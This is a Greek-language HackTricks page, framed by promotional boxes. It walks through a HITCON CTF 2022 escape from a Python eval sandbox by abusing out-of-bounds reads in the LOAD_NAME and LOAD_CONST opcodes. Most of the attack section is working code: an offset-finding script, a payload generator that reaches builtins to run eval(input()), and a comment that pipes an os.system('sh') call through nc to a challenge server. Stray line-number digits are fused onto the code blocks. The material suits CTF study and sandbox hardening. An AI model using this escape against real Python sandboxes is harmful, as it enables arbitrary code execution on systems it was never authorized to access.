# Φόρτωση Ονόματος / Φόρτωση Σταθεράς κωδικού OOB Read

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Αυτές οι πληροφορίες προήλθαν** [**από αυτήν την ανάλυση**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB read στον κωδικό LOAD\_NAME / LOAD\_CONST για να πάρουμε ορισμένο σύμβολο από τη μνήμη. Αυτό σημαίνει ότι χρησιμοποιούμε κόλπο όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να πάρουμε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλουμε.

Στη συνέχεια απλά δημιουργήστε την εκμετάλλευσή σας.

### Επισκόπηση <a href="#overview-1" id="overview-1"></a>

Ο πηγαίος κώδικας είναι αρκετά σύντομος, περιέχει μόνο 4 γραμμές!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Μπορείτε να εισάγετε αυθαίρετο κώδικα Python και θα μεταγλωττιστεί σε ένα [αντικείμενο κώδικα Python](https://docs.python.org/3/c-api/code.html). Ωστόσο, τα `co_consts` και `co_names` αυτού του αντικειμένου κώδικα θα αντικατασταθούν με ένα κενό tuple πριν από την αξιολόγηση αυτού του αντικειμένου κώδικα.

Έτσι, όλες οι εκφράσεις που περιέχουν σταθερές (π.χ. αριθμούς, συμβολοσειρές κλπ.) ή ονόματα (π.χ. μεταβλητές, συναρτήσεις) μπορεί να προκαλέσουν σφάλμα σεγματοποίησης (segmentation fault) στο τέλος.

### Ανάγνωση εκτός ορίων (Out of Bound Read) <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το σφάλμα σεγματοποίησης;

Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` μπορεί να μεταγλωττιστεί στον ακόλουθο κώδικα bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Αλλά τι γίνεται αν τα `co_names` γίνουν ένα άδειο tuple; Το opcode `LOAD_NAME 2` εξακολουθεί να εκτελείται και προσπαθεί να διαβάσει την τιμή από τη διεύθυνση μνήμης που θα έπρεπε αρχικά να βρίσκεται. Ναι, αυτό είναι ένα "χαρακτηριστικό" out-of-bound read.

Η βασική έννοια για τη λύση είναι απλή. Ορισμένα opcodes στο CPython, όπως το `LOAD_NAME` και το `LOAD_CONST`, είναι ευάλωτα (?) σε OOB read.

Ανακτούν ένα αντικείμενο από τον δείκτη `oparg` από το tuple `consts` ή `names` (αυτό που ονομάζεται `co_consts` και `co_names` κάτω από το καπό). Μπορούμε να ανατρέξουμε στο παρακάτω σύντομο απόσπασμα για το `LOAD_CONST` για να δούμε τι κάνει το CPython όταν επεξεργάζεται το opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε το χαρακτηριστικό OOB για να πάρουμε ένα "όνομα" από την αυθαίρετη μνήμη. Για να βεβαιωθούμε για το ποιο όνομα έχει και ποια είναι η μετατόπισή του, απλά δοκιμάζουμε τα `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και μπορείτε να βρείτε κάτι για oparg > 700. Μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη της μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;

### Δημιουργία της Εκμετάλλευσης <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Αφού ανακτήσουμε αυτές τις χρήσιμες μετατοπίσεις για ονόματα / σταθερές, πώς _μπορούμε_ να πάρουμε ένα όνομα / σταθερά από αυτήν τη μετατόπιση και να το χρησιμοποιήσουμε; Εδώ έχουμε ένα κόλπο για εσάς:\
Ας υποθέσουμε ότι μπορούμε να πάρουμε ένα όνομα `__getattribute__` από τη μετατόπιση 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλά κάντε τα εξής:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Παρατηρήστε ότι δεν είναι απαραίτητο να το ονομάσετε ως `__getattribute__`, μπορείτε να το ονομάσετε με κάτι πιο σύντομο ή πιο παράξενο.

Μπορείτε να κατανοήσετε τον λόγο πίσω από αυτό απλά παρακολουθώντας το bytecode του:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Παρατηρήστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Το Python φορτώνει ονόματα από την ίδια θέση αν το όνομα είναι το ίδιο, οπότε το δεύτερο `__getattribute__` φορτώνεται ακόμα από τη θέση offset=5. Χρησιμοποιώντας αυτήν τη δυνατότητα, μπορούμε να χρησιμοποιήσουμε οποιοδήποτε όνομα αφού το όνομα βρίσκεται στη μνήμη κοντά.

Για τη δημιουργία αριθμών θα πρέπει να είναι απλό:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Σενάριο Εκμετάλλευσης <a href="#exploit-script-1" id="exploit-script-1"></a>

Δεν χρησιμοποίησα σταθερές λόγω του ορίου μήκους.

Πρώτα, εδώ υπάρχει ένα σενάριο για να βρούμε αυτές τις θέσεις των ονομάτων.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλευτή Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Βασικά, κάνει τα εξής πράγματα, για εκείνες τις συμβολοσειρές που τις παίρνουμε από τη μέθοδο `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
